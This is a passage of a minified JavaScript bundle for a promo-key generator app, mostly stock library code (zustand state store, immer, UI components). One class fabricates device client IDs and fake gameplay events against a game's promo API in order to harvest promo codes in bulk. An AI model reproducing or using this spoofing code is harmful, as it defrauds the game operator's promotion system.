    return `Invalid prop \`value\` of value \`${e}\` supplied to \`${t}\`. The \`value\` prop must be:\n  - a positive number\n  - less than the value passed to \`max\` (or ${Lu} if no \`max\` prop is set)\n  - \`null\` or \`undefined\` if the progress is indeterminate.\n\nDefaulting to \`null\`.`
}
_p.displayName = Sp;
var kp = xp,
    Ly = _p;
const Yr = x.forwardRef((({
    className: e,
    value: t,
    ...n
}, r) => v.jsx(kp, {
    ref: r,
    className: de("relative h-4 w-full overflow-hidden rounded-full bg-secondary"),
    ...n,
    children: v.jsx(Ly, {
        className: de("h-full w-full flex-1 bg-primary transition-all", e),
        style: {
            transform: `translateX(-${100 - (t || 0)}%)`
        }
    })
})));

function My({
    className: e,
    ...t
}) {
    return v.jsx("div", {
        className: de({
            "animate-pulse": t.animation
        }, "rounded-md bg-muted", e),
        ...t
    })
}

function Dl({
    animation: e
}) {
    return v.jsx("div", {
        className: "flex gap-1",
        children: [...Array(5)].map(((t, n) => v.jsx(My, {
            animation: e,
            className: "h-8 w-[42px]"
        }, n)))
    })
}

function Fl({
    code: e
}) {
    const t = e.split("-");
    return v.jsx("div", {
        className: "flex justify-between flex-1 gap-1",
        children: t.map(((n, r) => v.jsx("p", {
            className: "flex justify-center items-center bg-slate-400 text-white text-xs rounded-md h-8 px-2",
            children: n
        }, r)))
    })
}

function Vl() {
    const [e, t] = x.useState(null);
    return {
        copiedText: e,
        copy: async function n(r) {
            if (null == navigator || !navigator.clipboard) return console.warn("clipboard not supported"), !1;
            try {
                return await navigator.clipboard.writeText(r), t(r), !0
            } catch (o) {
                return console.warn("copy failed", o), t(null), !1
            }
        }
    }
}
Yr.displayName = kp.displayName;

class Ul {
    constructor(t, n) {
        this.appToken = t, this.promoId = n
    }
    sleep(t) {
        return t += Math.random() / 3 + 1, new Promise((n => setTimeout(n, t)))
    }
    generateClientId() {
        return `${Date.now()}-${Array.from({ length: 19 }, (() => Math.floor(10 * Math.random()))).join("")}`
    }
    async login(t) {
        const n = await fetch("https://api.gamepromo.io/promo/login-client", {
            headers: {
                "content-type": "application/json; charset=utf-8",
                Host: "api.gamepromo.io"
            },
            method: "POST",
            body: JSON.stringify({
                appToken: this.appToken,
                clientId: t,
                clientOrigin: "deviceid"
            })
        }),
            {
                clientToken: r
            } = await n.json();
        return r
    }
    async check(t) {
        const n = await fetch("https://api.gamepromo.io/promo/register-event", {
            headers: {
                "content-type": "application/json; charset=utf-8",
                Host: "api.gamepromo.io",
                Authorization: `Bearer ${t}`
            },
            method: "POST",
            body: JSON.stringify({
                promoId: this.promoId,
                eventId: crypto.randomUUID(),
                eventOrigin: "undefined"
            })
        }),
            {
                hasCode: r
            } = await n.json();
        return r
    }
    async createCode(t) {
        const n = await fetch("https://api.gamepromo.io/promo/create-code", {
            headers: {
                "content-type": "application/json; charset=utf-8",
                Host: "api.gamepromo.io",
                Authorization: `Bearer ${t}`
            },
            method: "POST",
            body: JSON.stringify({
                promoId: this.promoId
            })
        }),
            {
                promoCode: r
            } = await n.json();
        return r
    }
    async generate() {
        const t = this.generateClientId(),
            n = await this.login(t);
        let r = null;
        for (; !r;) await this.sleep(2e4), r = await this.check(n);
        return await this.createCode(n)
    }
}

var Cp = {
    exports: {}
},
    Np = {},
    Pp = {
        exports: {}
    },
    Tp = {},
    An = x;

function Ay(e, t) {
    return e === t && (0 !== e || 1 / e == 1 / t) || e != e && t != t
}
var $y = "function" == typeof Object.is ? Object.is : Ay,
    Dy = An.useState,
    Fy = An.useEffect,
    Vy = An.useLayoutEffect,
    Uy = An.useDebugValue;

function by(e, t) {
    var n = t(),
        r = Dy({
            inst: {
                value: n,
                getSnapshot: t
            }
        }),
        o = r[0].inst,
        l = r[1];
    return Vy((function () {
        o.value = n, o.getSnapshot = t, Ei(o) && l({
            inst: o
        })
    }), [e, n, t]), Fy((function () {
        return Ei(o) && l({
            inst: o
        }), e((function () {
            Ei(o) && l({
                inst: o
            })
        }))
    }), [e]), Uy(n), n
}

function Ei(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !$y(e, n)
    } catch {
        return !0
    }
}

function Wy(e, t) {
    return t()
}
var Hy = typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u" ? Wy : by;
Tp.useSyncExternalStore = void 0 !== An.useSyncExternalStore ? An.useSyncExternalStore : Hy, Pp.exports = Tp;
var By = Pp.exports,
    bl = x,
    Gy = By;

function Ky(e, t) {
    return e === t && (0 !== e || 1 / e == 1 / t) || e != e && t != t
}
var Qy = "function" == typeof Object.is ? Object.is : Ky,
    Yy = Gy.useSyncExternalStore,
    Xy = bl.useRef,
    Jy = bl.useEffect,
    Zy = bl.useMemo,
    qy = bl.useDebugValue;
Np.useSyncExternalStoreWithSelector = function (e, t, n, r, o) {
    var l = Xy(null);
    if (null === l.current) {
        var i = {
            hasValue: !1,
            value: null
        };
        l.current = i
    } else i = l.current;
    l = Zy((function () {
        function u(g) {
            if (!a) {
                if (a = !0, c = g, g = r(g), void 0 !== o && i.hasValue) {
                    var w = i.value;
                    if (o(w, g)) return p = w
                }
                return p = g
            }
            if (w = p, Qy(c, g)) return w;
            var y = r(g);
            return void 0 !== o && o(w, y) ? w : (c = g, p = y)
        }
        var c, p, a = !1,
            m = void 0 === n ? null : n;
        return [function () {
            return u(t())
        }, null === m ? void 0 : function () {
            return u(m())
        }]
    }), [t, n, r, o]);
    var s = Yy(e, l[0], l[1]);
    return Jy((function () {
        i.hasValue = !0, i.value = s
    }), [s]), qy(s), s
}, Cp.exports = Np;
var e0 = Cp.exports;
const t0 = ac(e0);
var n0 = {
    BASE_URL: "/",
    DEV: !1,
    MODE: "production",
    PROD: !0,
    SSR: !1,
    VITE_APP_VERSION: "0.3.2",
    VITE_LOCAL_STORAGE_KEY: "hamster-tools.react.v0.3.0",
    VITE_TG_WEB_APP: "https://t.me/hamster_keys_tools_bot",
    VITE_VERCEL_BRANCH_URL: "hamster-tools-git-main-duckmetrs-projects.vercel.app",
    VITE_VERCEL_ENV: "production",
    VITE_VERCEL_GIT_COMMIT_AUTHOR_LOGIN: "duckmetr",
    VITE_VERCEL_GIT_COMMIT_AUTHOR_NAME: "Alexander Lorenzo",
    VITE_VERCEL_GIT_COMMIT_MESSAGE: "Merge pull request #8 from duckmetr/dev\n\nadd redirect if is not mini app",
    VITE_VERCEL_GIT_COMMIT_REF: "main",
    VITE_VERCEL_GIT_COMMIT_SHA: "7fb0608b24435d61c67c5d1a5d3f8e623e4a58f2",
    VITE_VERCEL_GIT_PREVIOUS_SHA: "",
    VITE_VERCEL_GIT_PROVIDER: "github",
    VITE_VERCEL_GIT_PULL_REQUEST_ID: "",
    VITE_VERCEL_GIT_REPO_ID: "836451630",
    VITE_VERCEL_GIT_REPO_OWNER: "duckmetr",
    VITE_VERCEL_GIT_REPO_SLUG: "hamster-tools",
    VITE_VERCEL_PROJECT_PRODUCTION_URL: "hamster-tools.vercel.app",
    VITE_VERCEL_URL: "hamster-tools-jp8tx9dhd-duckmetrs-projects.vercel.app"
};
const ec = e => {
    let t;
    const n = new Set,
        r = (c, p) => {
            const m = "function" == typeof c ? c(t) : c;
            if (!Object.is(m, t)) {
                const g = t;
                t = p ?? ("object" != typeof m || null === m) ? m : Object.assign({}, t, m), n.forEach((w => w(t, g)))
            }
        },
        o = () => t,
        u = {
            setState: r,
            getState: o,
            getInitialState: () => a,
            subscribe: c => (n.add(c), () => n.delete(c)),
            destroy: () => {
                "production" !== (n0 ? "production" : void 0) && console.warn("[DEPRECATED] The `destroy` method will be unsupported in a future version. Instead use unsubscribe function returned by subscribe. Everything will be garbage-collected if store is garbage-collected."), n.clear()
            }
        },
        a = t = e(r, o, u);
    return u
},
    r0 = e => e ? ec(e) : ec,
    {
        useDebugValue: o0
    } = Ye,
    {
        useSyncExternalStoreWithSelector: l0
    } = t0,
    i0 = e => e;

function s0(e, t = i0, n) {
    const r = l0(e.subscribe, e.getState, e.getServerState || e.getInitialState, t, n);
    return o0(r), r
}
const tc = (e, t) => {
    const n = r0(e),
        r = (o, l = t) => s0(n, o, l);
    return Object.assign(r, n), r
},
    u0 = (e, t) => e ? tc(e, t) : tc;

function a0(e, t) {
    if (Object.is(e, t)) return !0;
    if ("object" != typeof e || null === e || "object" != typeof t || null === t) return !1;
    if (e instanceof Map && t instanceof Map) {
        if (e.size !== t.size) return !1;
        for (const [r, o] of e)
            if (!Object.is(o, t.get(r))) return !1;
        return !0
    }
    if (e instanceof Set && t instanceof Set) {
        if (e.size !== t.size) return !1;
        for (const r of e)
            if (!t.has(r)) return !1;
        return !0
    }
    const n = Object.keys(e);
    if (n.length !== Object.keys(t).length) return !1;
    for (const r of n)
        if (!Object.prototype.hasOwnProperty.call(t, r) || !Object.is(e[r], t[r])) return !1;
    return !0
}
var Fo = {
    BASE_URL: "/",
    DEV: !1,
    MODE: "production",
    PROD: !0,
    SSR: !1,
    VITE_APP_VERSION: "0.3.2",
    VITE_LOCAL_STORAGE_KEY: "hamster-tools.react.v0.3.0",
    VITE_TG_WEB_APP: "https://t.me/hamster_keys_tools_bot",
    VITE_VERCEL_BRANCH_URL: "hamster-tools-git-main-duckmetrs-projects.vercel.app",
    VITE_VERCEL_ENV: "production",
    VITE_VERCEL_GIT_COMMIT_AUTHOR_LOGIN: "duckmetr",
    VITE_VERCEL_GIT_COMMIT_AUTHOR_NAME: "Alexander Lorenzo",
    VITE_VERCEL_GIT_COMMIT_MESSAGE: "Merge pull request #8 from duckmetr/dev\n\nadd redirect if is not mini app",
    VITE_VERCEL_GIT_COMMIT_REF: "main",
    VITE_VERCEL_GIT_COMMIT_SHA: "7fb0608b24435d61c67c5d1a5d3f8e623e4a58f2",
    VITE_VERCEL_GIT_PREVIOUS_SHA: "",
    VITE_VERCEL_GIT_PROVIDER: "github",
    VITE_VERCEL_GIT_PULL_REQUEST_ID: "",
    VITE_VERCEL_GIT_REPO_ID: "836451630",
    VITE_VERCEL_GIT_REPO_OWNER: "duckmetr",
    VITE_VERCEL_GIT_REPO_SLUG: "hamster-tools",
    VITE_VERCEL_PROJECT_PRODUCTION_URL: "hamster-tools.vercel.app",
    VITE_VERCEL_URL: "hamster-tools-jp8tx9dhd-duckmetrs-projects.vercel.app"
};
const Ns = new Map,
    wo = e => {
        const t = Ns.get(e);
        return t ? Object.fromEntries(Object.entries(t.stores).map((([n, r]) => [n, r.getState()]))) : {}
    },
    c0 = (e, t, n) => {
        if (void 0 === e) return {
            type: "untracked",
            connection: t.connect(n)
        };
        const r = Ns.get(n.name);
        if (r) return {
            type: "tracked",
            store: e,
            ...r
        };
        const o = {
            connection: t.connect(n),
            stores: {}
        };
        return Ns.set(n.name, o), {
            type: "tracked",
            store: e,
            ...o
        }
    },
    d0 = (e, t = {}) => (n, r, o) => {
        const {
            enabled: l,
            anonymousActionType: i,
            store: s,
            ...u
        } = t;
        let a;
        try {
            a = (l ?? "production" !== (Fo ? "production" : void 0)) && window.__REDUX_DEVTOOLS_EXTENSION__
        } catch { }
        if (!a) return "production" !== (Fo ? "production" : void 0) && l && console.warn("[zustand devtools middleware] Please install/enable Redux devtools extension"), e(n, r, o);
        const {
            connection: c,
            ...p
        } = c0(s, a, u);
        let m = !0;
        o.setState = (y, S, f) => {
            const d = n(y, S);
            if (!m) return d;
            const h = void 0 === f ? {
                type: i || "anonymous"
            } : "string" == typeof f ? {
                type: f
            } : f;
            return void 0 === s ? (null == c || c.send(h, r()), d) : (null == c || c.send({
                ...h,
                type: `${s}/${h.type}`
            }, {
                ...wo(u.name),
                [s]: o.getState()
            }), d)
        };
        const g = (...y) => {
            const S = m;
            m = !1, n(...y), m = S
        },
            w = e(o.setState, r, o);
        if ("untracked" === p.type ? null == c || c.init(w) : (p.stores[p.store] = o, null == c || c.init(Object.fromEntries(Object.entries(p.stores).map((([y, S]) => [y, y === p.store ? w : S.getState()]))))), o.dispatchFromDevtools && "function" == typeof o.dispatch) {
            let y = !1;
            const S = o.dispatch;
            o.dispatch = (...f) => {
                "production" !== (Fo ? "production" : void 0) && "__setState" === f[0].type && !y && (console.warn('[zustand devtools middleware] "__setState" action type is reserved to set state from the devtools. Avoid using it.'), y = !0), S(...f)
            }
        }
        return c.subscribe((y => {
            var S;
            switch (y.type) {
                case "ACTION":
                    return "string" != typeof y.payload ? void console.error("[zustand devtools middleware] Unsupported action format") : ki(y.payload, (f => {
                        if ("__setState" !== f.type) o.dispatchFromDevtools && "function" == typeof o.dispatch && o.dispatch(f);
                        else {
                            if (void 0 === s) return void g(f.state);
                            1 !== Object.keys(f.state).length && console.error('\n                    [zustand devtools middleware] Unsupported __setState action format. \n                    When using \'store\' option in devtools(), the \'state\' should have only one key, which is a value of \'store\' that was passed in devtools(),\n                    and value of this only key should be a state object. Example: { "type": "__setState", "state": { "abc123Store": { "foo": "bar" } } }\n                    ');
                            const d = f.state[s];
                            if (null == d) return;
                            JSON.stringify(o.getState()) !== JSON.stringify(d) && g(d)
                        }
                    }));
                case "DISPATCH":
                    switch (y.payload.type) {
                        case "RESET":
                            return g(w), void 0 === s ? null == c ? void 0 : c.init(o.getState()) : null == c ? void 0 : c.init(wo(u.name));
                        case "COMMIT":
                            return void 0 === s ? void (null == c || c.init(o.getState())) : null == c ? void 0 : c.init(wo(u.name));
                        case "ROLLBACK":
                            return ki(y.state, (f => {
                                if (void 0 === s) return g(f), void (null == c || c.init(o.getState()));
                                g(f[s]), null == c || c.init(wo(u.name))
                            }));
                        case "JUMP_TO_STATE":
                        case "JUMP_TO_ACTION":
                            return ki(y.state, (f => {
                                void 0 !== s ? JSON.stringify(o.getState()) !== JSON.stringify(f[s]) && g(f[s]) : g(f)
                            }));
                        case "IMPORT_STATE": {
                            const {
                                nextLiftedState: f
                            } = y.payload, d = null == (S = f.computedStates.slice(-1)[0]) ? void 0 : S.state;
                            if (!d) return;
                            return g(void 0 === s ? d : d[s]), void (null == c || c.send(null, f))
                        }
                        case "PAUSE_RECORDING":
                            return m = !m
                    }
                    return
            }
        })), w
    },
    f0 = d0,
    ki = (e, t) => {
        let n;
        try {
            n = JSON.parse(e)
        } catch (r) {
            console.error("[zustand devtools middleware] Could not parse the received json", r)
        }
        void 0 !== n && t(n)
    };

function p0(e, t) {
    let n;
    try {
        n = e()
    } catch {
        return
    }
    return {
        getItem: o => {
            var l;
            const i = u => null === u ? null : JSON.parse(u, void 0),
                s = null != (l = n.getItem(o)) ? l : null;
            return s instanceof Promise ? s.then(i) : i(s)
        },
        setItem: (o, l) => n.setItem(o, JSON.stringify(l, void 0)),
        removeItem: o => n.removeItem(o)
    }
}
const zr = e => t => {
    try {
        const n = e(t);
        return n instanceof Promise ? n : {
            then: r => zr(r)(n),
            catch(r) {
                return this
            }
        }
    } catch (n) {
        return {
            then(r) {
                return this
            },
            catch: r => zr(r)(n)
        }
    }
},
    m0 = (e, t) => (n, r, o) => {
        let l = {
            getStorage: () => localStorage,
            serialize: JSON.stringify,
            deserialize: JSON.parse,
            partialize: S => S,
            version: 0,
            merge: (S, f) => ({
                ...f,
                ...S
            }),
            ...t
        },
            i = !1;
        const s = new Set,
            u = new Set;
        let a;
        try {
            a = l.getStorage()
        } catch { }
        if (!a) return e(((...S) => {
            console.warn(`[zustand persist middleware] Unable to update item '${l.name}', the given storage is currently unavailable.`), n(...S)
        }), r, o);
        const c = zr(l.serialize),
            p = () => {
                const S = l.partialize({
                    ...r()
                });
                let f;
                const d = c({
                    state: S,
                    version: l.version
                }).then((h => a.setItem(l.name, h))).catch((h => {
                    f = h
                }));
                if (f) throw f;
                return d
            },
            m = o.setState;
        o.setState = (S, f) => {
            m(S, f), p()
        };
        const g = e(((...S) => {
            n(...S), p()
        }), r, o);
        let w;
        const y = () => {
            var S;
            if (!a) return;
            i = !1, s.forEach((d => d(r())));
            const f = (null == (S = l.onRehydrateStorage) ? void 0 : S.call(l, r())) || void 0;
            return zr(a.getItem.bind(a))(l.name).then((d => {
                if (d) return l.deserialize(d)
            })).then((d => {
                if (d) {
                    if ("number" != typeof d.version || d.version === l.version) return d.state;
                    if (l.migrate) return l.migrate(d.state, d.version);
                    console.error("State loaded from storage couldn't be migrated since no migrate function was provided")
                }
            })).then((d => {
                var h;
                return w = l.merge(d, null != (h = r()) ? h : g), n(w, !0), p()
            })).then((() => {
                null == f || f(w, void 0), i = !0, u.forEach((d => d(w)))
            })).catch((d => {
                null == f || f(void 0, d)
            }))
        };
        return o.persist = {
            setOptions: S => {
                l = {
                    ...l,
                    ...S
                }, S.getStorage && (a = S.getStorage())
            },
            clearStorage: () => {
                null == a || a.removeItem(l.name)
            },
            getOptions: () => l,
            rehydrate: () => y(),
            hasHydrated: () => i,
            onHydrate: S => (s.add(S), () => {
                s.delete(S)
            }),
            onFinishHydration: S => (u.add(S), () => {
                u.delete(S)
            })
        }, y(), w || g
    },
    h0 = (e, t) => (n, r, o) => {
        let l = {
            storage: p0((() => localStorage)),
            partialize: y => y,
            version: 0,
            merge: (y, S) => ({
                ...S,
                ...y
            }),
            ...t
        },
            i = !1;
        const s = new Set,
            u = new Set;
        let a = l.storage;
        if (!a) return e(((...y) => {
            console.warn(`[zustand persist middleware] Unable to update item '${l.name}', the given storage is currently unavailable.`), n(...y)
        }), r, o);
        const c = () => {
            const y = l.partialize({
                ...r()
            });
            return a.setItem(l.name, {
                state: y,
                version: l.version
            })
        },
            p = o.setState;
        o.setState = (y, S) => {
            p(y, S), c()
        };
        const m = e(((...y) => {
            n(...y), c()
        }), r, o);
        let g;
        o.getInitialState = () => m;
        const w = () => {
            var y, S;
            if (!a) return;
            i = !1, s.forEach((d => {
                var h;
                return d(null != (h = r()) ? h : m)
            }));
            const f = (null == (S = l.onRehydrateStorage) ? void 0 : S.call(l, null != (y = r()) ? y : m)) || void 0;
            return zr(a.getItem.bind(a))(l.name).then((d => {
                if (d) {
                    if ("number" != typeof d.version || d.version === l.version) return d.state;
                    if (l.migrate) return l.migrate(d.state, d.version);
                    console.error("State loaded from storage couldn't be migrated since no migrate function was provided")
                }
            })).then((d => {
                var h;
                return g = l.merge(d, null != (h = r()) ? h : m), n(g, !0), c()
            })).then((() => {
                null == f || f(g, void 0), g = r(), i = !0, u.forEach((d => d(g)))
            })).catch((d => {
                null == f || f(void 0, d)
            }))
        };
        return o.persist = {
            setOptions: y => {
                l = {
                    ...l,
                    ...y
                }, y.storage && (a = y.storage)
            },
            clearStorage: () => {
                null == a || a.removeItem(l.name)
            },
            getOptions: () => l,
            rehydrate: () => w(),
            hasHydrated: () => i,
            onHydrate: y => (s.add(y), () => {
                s.delete(y)
            }),
            onFinishHydration: y => (u.add(y), () => {
                u.delete(y)
            })
        }, l.skipHydration || w(), g || m
    },
    v0 = (e, t) => "getStorage" in t || "serialize" in t || "deserialize" in t ? ("production" !== (Fo ? "production" : void 0) && console.warn("[DEPRECATED] `getStorage`, `serialize` and `deserialize` options are deprecated. Use `storage` option instead."), m0(e, t)) : h0(e, t),
    g0 = v0;
var Ip = Symbol.for("immer-nothing"),
    nc = Symbol.for("immer-draftable"),
    Pe = Symbol.for("immer-state");

function Ue(e, ...t) {
    throw new Error(`[Immer] minified error nr: ${e}. Full error at: https://bit.ly/3cXEKWf`)
}
var $n = Object.getPrototypeOf;

function Dn(e) {
    return !!e && !!e[Pe]
}

function nn(e) {
    var t;
    return !!e && (Rp(e) || Array.isArray(e) || !!e[nc] || !(null == (t = e.constructor) || !t[nc]) || Hl(e) || Bl(e))
}
var y0 = Object.prototype.constructor.toString();

function Rp(e) {
    if (!e || "object" != typeof e) return !1;
    const t = $n(e);
    if (null === t) return !0;
    const n = Object.hasOwnProperty.call(t, "constructor") && t.constructor;
    return n === Object || "function" == typeof n && Function.toString.call(n) === y0
}

function pl(e, t) {
    0 === Wl(e) ? Reflect.ownKeys(e).forEach((n => {
        t(n, e[n], e)
    })) : e.forEach(((n, r) => t(r, n, e)))
}

function Wl(e) {
    const t = e[Pe];
    return t ? t.type_ : Array.isArray(e) ? 1 : Hl(e) ? 2 : Bl(e) ? 3 : 0
}

function Ps(e, t) {
    return 2 === Wl(e) ? e.has(t) : Object.prototype.hasOwnProperty.call(e, t)
}

function jp(e, t, n) {
    const r = Wl(e);
    2 === r ? e.set(t, n) : 3 === r ? e.add(n) : e[t] = n
}

function w0(e, t) {
    return e === t ? 0 !== e || 1 / e == 1 / t : e != e && t != t
}

function Hl(e) {
    return e instanceof Map
}

function Bl(e) {
    return e instanceof Set
}

function Ht(e) {
    return e.copy_ || e.base_
}

function Ts(e, t) {
    if (Hl(e)) return new Map(e);
    if (Bl(e)) return new Set(e);
    if (Array.isArray(e)) return Array.prototype.slice.call(e);
    const n = Rp(e);
    if (!0 === t || "class_only" === t && !n) {
        const r = Object.getOwnPropertyDescriptors(e);
        delete r[Pe];
        let o = Reflect.ownKeys(r);
        for (let l = 0; l < o.length; l++) {
            const i = o[l],
                s = r[i];
            !1 === s.writable && (s.writable = !0, s.configurable = !0), (s.get || s.set) && (r[i] = {
                configurable: !0,
                writable: !0,
                enumerable: s.enumerable,
                value: e[i]
            })
        }
        return Object.create($n(e), r)
    } {
        const r = $n(e);
        if (null !== r && n) return {
            ...e
        };
        const o = Object.create(r);
        return Object.assign(o, e)
    }
}

function Mu(e, t = !1) {
    return Gl(e) || Dn(e) || !nn(e) || (Wl(e) > 1 && (e.set = e.add = e.clear = e.delete = x0), Object.freeze(e), t && Object.entries(e).forEach((([n, r]) => Mu(r, !0)))), e
}

function x0() {
    Ue(2)
}

function Gl(e) {
    return Object.isFrozen(e)
}
var Lr, S0 = {};

function rn(e) {
    const t = S0[e];
    return t || Ue(0, e), t
}

function Op() {
    return Lr
}

function _0(e, t) {
    return {
        drafts_: [],
        parent_: e,
        immer_: t,
        canAutoFreeze_: !0,
        unfinalizedDrafts_: 0
    }
}

function rc(e, t) {
    t && (rn("Patches"), e.patches_ = [], e.inversePatches_ = [], e.patchListener_ = t)
}

function Is(e) {
    Rs(e), e.drafts_.forEach(E0), e.drafts_ = null
}

function Rs(e) {
    e === Lr && (Lr = e.parent_)
}

function oc(e) {
    return Lr = _0(Lr, e)
}

function E0(e) {
    const t = e[Pe];
    0 === t.type_ || 1 === t.type_ ? t.revoke_() : t.revoked_ = !0
}

function lc(e, t) {
    t.unfinalizedDrafts_ = t.drafts_.length;
    const n = t.drafts_[0];
    return void 0 !== e && e !== n ? (n[Pe].modified_ && (Is(t), Ue(4)), nn(e) && (e = ml(t, e), t.parent_ || hl(t, e)), t.patches_ && rn("Patches").generateReplacementPatches_(n[Pe].base_, e, t.patches_, t.inversePatches_)) : e = ml(t, n, []), Is(t), t.patches_ && t.patchListener_(t.patches_, t.inversePatches_), e !== Ip ? e : void 0
}

function ml(e, t, n) {
    if (Gl(t)) return t;
    const r = t[Pe];
    if (!r) return pl(t, ((o, l) => ic(e, r, t, o, l, n))), t;
    if (r.scope_ !== e) return t;
    if (!r.modified_) return hl(e, r.base_, !0), r.base_;
    if (!r.finalized_) {
        r.finalized_ = !0, r.scope_.unfinalizedDrafts_--;
        const o = r.copy_;
        let l = o,
            i = !1;
        3 === r.type_ && (l = new Set(o), o.clear(), i = !0), pl(l, ((s, u) => ic(e, r, o, s, u, n, i))), hl(e, o, !1), n && e.patches_ && rn("Patches").generatePatches_(r, n, e.patches_, e.inversePatches_)
    }
    return r.copy_
}

function ic(e, t, n, r, o, l, i) {
    if (Dn(o)) {
        const u = ml(e, o, l && t && 3 !== t.type_ && !Ps(t.assigned_, r) ? l.concat(r) : void 0);
        if (jp(n, r, u), !Dn(u)) return;
        e.canAutoFreeze_ = !1
    } else i && n.add(o);
    if (nn(o) && !Gl(o)) {
        if (!e.immer_.autoFreeze_ && e.unfinalizedDrafts_ < 1) return;
        ml(e, o), (!t || !t.scope_.parent_) && "symbol" != typeof r && Object.prototype.propertyIsEnumerable.call(n, r) && hl(e, o)
    }
}

function hl(e, t, n = !1) {
    !e.parent_ && e.immer_.autoFreeze_ && e.canAutoFreeze_ && Mu(t, n)
}

function k0(e, t) {
    const n = Array.isArray(e),
        r = {
            type_: n ? 1 : 0,
            scope_: t ? t.scope_ : Op(),
            modified_: !1,
            finalized_: !1,
            assigned_: {},
            parent_: t,
            base_: e,
            draft_: null,
            copy_: null,
            revoke_: null,
            isManual_: !1
        };
    let o = r,
        l = Au;
    n && (o = [r], l = Mr);
    const {
        revoke: i,
        proxy: s
    } = Proxy.revocable(o, l);
    return r.draft_ = s, r.revoke_ = i, s
}
var Au = {
    get(e, t) {
        if (t === Pe) return e;
        const n = Ht(e);
        if (!Ps(n, t)) return C0(e, n, t);
        const r = n[t];
        return e.finalized_ || !nn(r) ? r : r === Ci(e.base_, t) ? (Ni(e), e.copy_[t] = Os(r, e)) : r
    },
    has: (e, t) => t in Ht(e),
    ownKeys: e => Reflect.ownKeys(Ht(e)),
    set(e, t, n) {
        const r = zp(Ht(e), t);
        if (null != r && r.set) return r.set.call(e.draft_, n), !0;
        if (!e.modified_) {
            const o = Ci(Ht(e), t),
                l = null == o ? void 0 : o[Pe];
            if (l && l.base_ === n) return e.copy_[t] = n, e.assigned_[t] = !1, !0;
            if (w0(n, o) && (void 0 !== n || Ps(e.base_, t))) return !0;
            Ni(e), js(e)
        }
        return e.copy_[t] === n && (void 0 !== n || t in e.copy_) || Number.isNaN(n) && Number.isNaN(e.copy_[t]) || (e.copy_[t] = n, e.assigned_[t] = !0), !0
    },
    deleteProperty: (e, t) => (void 0 !== Ci(e.base_, t) || t in e.base_ ? (e.assigned_[t] = !1, Ni(e), js(e)) : delete e.assigned_[t], e.copy_ && delete e.copy_[t], !0),
    getOwnPropertyDescriptor(e, t) {
        const n = Ht(e),
            r = Reflect.getOwnPropertyDescriptor(n, t);
        return r && {
            writable: !0,
            configurable: 1 !== e.type_ || "length" !== t,
            enumerable: r.enumerable,
            value: n[t]
        }
    },
    defineProperty() {
        Ue(11)
    },
    getPrototypeOf: e => $n(e.base_),
    setPrototypeOf() {
        Ue(12)
    }
},
    Mr = {};

function Ci(e, t) {
    const n = e[Pe];
    return (n ? Ht(n) : e)[t]
}

function C0(e, t, n) {
    var o;
    const r = zp(t, n);
    return r ? "value" in r ? r.value : null == (o = r.get) ? void 0 : o.call(e.draft_) : void 0
}

function zp(e, t) {
    if (!(t in e)) return;
    let n = $n(e);
    for (; n;) {
        const r = Object.getOwnPropertyDescriptor(n, t);
        if (r) return r;
        n = $n(n)
    }
}

function js(e) {
    e.modified_ || (e.modified_ = !0, e.parent_ && js(e.parent_))
}

function Ni(e) {
    e.copy_ || (e.copy_ = Ts(e.base_, e.scope_.immer_.useStrictShallowCopy_))
}
pl(Au, ((e, t) => {
    Mr[e] = function () {
        return arguments[0] = arguments[0][0], t.apply(this, arguments)
    }
})), Mr.deleteProperty = function (e, t) {
    return Mr.set.call(this, e, t, void 0)
}, Mr.set = function (e, t, n) {
    return Au.set.call(this, e[0], t, n, e[0])
};
var N0 = class {
    constructor(e) {
        this.autoFreeze_ = !0, this.useStrictShallowCopy_ = !1, this.produce = (t, n, r) => {
            if ("function" == typeof t && "function" != typeof n) {
                const l = n;
                n = t;
                const i = this;
                return function (u = l, ...a) {
                    return i.produce(u, (c => n.call(this, c, ...a)))
                }
            }
            let o;
            if ("function" != typeof n && Ue(6), void 0 !== r && "function" != typeof r && Ue(7), nn(t)) {
                const l = oc(this),
                    i = Os(t, void 0);
                let s = !0;
                try {
                    o = n(i), s = !1
                } finally {
                    s ? Is(l) : Rs(l)
                }
                return rc(l, r), lc(o, l)
            }
            if (!t || "object" != typeof t) {
                if (o = n(t), void 0 === o && (o = t), o === Ip && (o = void 0), this.autoFreeze_ && Mu(o, !0), r) {
                    const l = [],
                        i = [];
                    rn("Patches").generateReplacementPatches_(t, o, l, i), r(l, i)
                }
                return o
            }
            Ue(1, t)
        }, this.produceWithPatches = (t, n) => {
            if ("function" == typeof t) return (i, ...s) => this.produceWithPatches(i, (u => t(u, ...s)));
            let r, o;
            return [this.produce(t, n, ((i, s) => {
                r = i, o = s
            })), r, o]
        }, "boolean" == typeof (null == e ? void 0 : e.autoFreeze) && this.setAutoFreeze(e.autoFreeze), "boolean" == typeof (null == e ? void 0 : e.useStrictShallowCopy) && this.setUseStrictShallowCopy(e.useStrictShallowCopy)
    }
    createDraft(e) {
        nn(e) || Ue(8), Dn(e) && (e = P0(e));
        const t = oc(this),
            n = Os(e, void 0);
        return n[Pe].isManual_ = !0, Rs(t), n
    }
    finishDraft(e, t) {
        const n = e && e[Pe];
        (!n || !n.isManual_) && Ue(9);
        const {
            scope_: r
        } = n;
        return rc(r, t), lc(void 0, r)
    }
    setAutoFreeze(e) {
        this.autoFreeze_ = e
    }
    setUseStrictShallowCopy(e) {
        this.useStrictShallowCopy_ = e
    }
    applyPatches(e, t) {
        let n;
        for (n = t.length - 1; n >= 0; n--) {
            const o = t[n];
            if (0 === o.path.length && "replace" === o.op) {
                e = o.value;
                break
            }
        }
        n > -1 && (t = t.slice(n + 1));
        const r = rn("Patches").applyPatches_;
        return Dn(e) ? r(e, t) : this.produce(e, (o => r(o, t)))
    }
};

function Os(e, t) {
    const n = Hl(e) ? rn("MapSet").proxyMap_(e, t) : Bl(e) ? rn("MapSet").proxySet_(e, t) : k0(e, t);
    return (t ? t.scope_ : Op()).drafts_.push(n), n
}

function P0(e) {
    return Dn(e) || Ue(10, e), Lp(e)
}

function Lp(e) {
    if (!nn(e) || Gl(e)) return e;
    const t = e[Pe];
    let n;
    if (t) {
        if (!t.modified_) return t.base_;
        t.finalized_ = !0, n = Ts(e, t.scope_.immer_.useStrictShallowCopy_)
    } else n = Ts(e, !0);
    return pl(n, ((r, o) => {
        jp(n, r, Lp(o))
    })), t && (t.finalized_ = !1), n
}
var Te = new N0,
    T0 = Te.produce;
